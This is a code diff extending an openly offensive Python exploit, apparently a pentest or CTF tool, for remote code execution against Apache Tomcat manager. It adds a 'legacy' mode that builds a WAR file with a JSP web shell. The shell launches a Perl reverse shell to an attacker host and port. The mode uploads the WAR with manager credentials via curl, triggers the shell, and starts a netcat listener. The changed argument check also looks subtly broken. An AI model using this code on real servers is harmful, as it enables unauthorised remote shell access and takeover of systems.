@@ -247,6 +247,57 @@ def undeploy_war():
 
     return False
 
+
+def build_legacy_war():
+
+    print("[+] Build legacy_war")
+
+    try:
+        os.makedirs('/tmp/warfiles_legacy/META-INF')
+        os.makedirs('/tmp/warfiles_legacy/WEB-INF')
+    except:
+        pass
+
+    web_xml = '''<?xml version="1.0" ?>
+    <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
+    http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
+    version="2.4">
+    <servlet>
+    <servlet-name>Command</servlet-name>
+    <jsp-file>/cmd.jsp</jsp-file>
+    </servlet>
+    </web-app>
+    '''
+
+    with open('/tmp/warfiles_legacy/WEB-INF/web.xml', 'w') as f:
+        f.write(web_xml)
+
+    manifest_mf = '''Manifest-Version: 1.0
+    Created-By: 1.6.0_10 (Sun Microsystems Inc.)
+    '''
+
+    with open('/tmp/warfiles_legacy/META-INF/MANIFEST.MF', 'w') as f:
+        f.write(manifest_mf)
+
+    cmd_jsp = '''<%@ page import="java.util.*,java.io.*"%>\n'''
+    cmd_jsp += '''<%\n'''
+
+    cmd_jsp += '''if (request.getParameter("payload") != null) {'''
+    cmd_jsp += ''' String [] command = {"/usr/bin/perl","-e", "use Socket;$i=\\"%s\\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");};"};
+        Runtime rt = Runtime.getRuntime();
+        Process pr = rt.exec( command );
+        pr.waitFor();\n}\n''' % (LHOST, LPORT)
+
+    cmd_jsp += '''%>'''
+
+    with open('/tmp/warfiles_legacy/cmd.jsp', 'w') as f:
+        f.write(cmd_jsp)
+
+    os.system('cd /tmp/warfiles_legacy && jar cvf cmd.war . >/dev/null 2>&1')
+
+
 def build_war():
 
     try:
@@ -446,6 +497,14 @@ def build_windows_payload():
     with open('/tmp/shell.ps1', 'w') as f:
         f.write(payload)
 
+
+def legacy_pop():
+
+    time.sleep(3)
+    cmd = '''curl -u %s:%s "%s/payload/cmd.jsp?payload"''' % (USERNAME, PASSWORD, URL)
+    os.system(cmd)
+
+
 def HttpListener():
 
     os.chdir('/tmp')
@@ -455,9 +514,10 @@ def HttpListener():
     print("[+] HTTP Listen = %s" % HTTP_PORT)
     httpd.serve_forever()
 
+
 if __name__ == '__main__':
 
-    if len(sys.argv) != 6:
+    if len(sys.argv) <= 6:
         print ("""
 ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄████▄   ▄▄▄     ▄▄▄█████▓ █     █░ ▄▄▄       ██▀███   ██▀███   ▄████▄  ▓█████
 ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
@@ -471,8 +531,8 @@ if __name__ == '__main__':
 ░                                                               ░
 [nighter@nighter.se]
     """)
-        print("Usage: %s <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
-        print("\nEXAMPLE: ./tomcat_war_rce.py 'http://127.0.0.1:8080' 10.10.14.24 1337 <USERNAME> <PASSWORD>\n")
+        print("Usage: %s <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD> [1]" % (sys.argv[0]))
+        print("\nEXAMPLE: ./tomcat_war_rce.py 'http://127.0.0.1:8080' 10.10.14.24 1337 <USERNAME> <PASSWORD> [1=legacy]\n")
         sys.exit(0)
 
     URL = sys.argv[1]
@@ -481,7 +541,29 @@ if __name__ == '__main__':
     USERNAME = sys.argv[4]
     PASSWORD = sys.argv[5]
 
+    try:
+        LEGACY = sys.argv[6]
+    except:
+        LEGACY = '0'
+
     print("[+] LHOST = %s" % LHOST)
+
+    # This works on very old Tomcat servers.
+    if LEGACY == '1':
+        print("[+] Runs Linux Legacy Tomcat Payload")
+        build_legacy_war()
+        time.sleep(1)
+
+        # Lazy upload with curl.
+        cmd = '''curl -u %s:%s --upload-file /tmp/warfiles_legacy/cmd.war "%s/manager/deploy?path=/payload"''' % (USERNAME, PASSWORD, URL)
+        os.system(cmd)
+
+        p = Process(target=legacy_pop)
+        p.start()
+
+        print("[+] Netcat port: %s" % LPORT)
+        os.system('nc -lnvp %s' % LPORT)
+        sys.exit(0)
 
     build_war()
     deploy_war()
